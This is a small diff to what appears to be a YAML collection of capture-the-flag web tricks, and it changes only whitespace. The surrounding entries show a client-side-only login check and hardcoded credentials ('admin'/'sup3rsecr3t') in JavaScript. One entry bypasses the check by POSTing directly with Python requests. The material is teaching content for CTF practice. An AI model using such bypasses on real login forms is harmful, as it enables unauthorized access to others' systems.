@@ -14,10 +14,10 @@ tricks:
     payload: |
       # JavaScript validation:
       # if (document.form.password.value=='sup3rsecr3t' && document.form.username.value=='admin')
-      
+
       # Server-side PHP:
       # if(isset($_POST['username'])) { echo $flag; }
-      
+
       # Exploit - bypass JavaScript, directly POST:
       import requests
       requests.post(url, data={"username": "anything"})
@@ -28,4 +28,3 @@ tricks:
     payload: |
       # Credentials in JavaScript:
       # password.value=='sup3rsecr3t' && username.value=='admin'
-
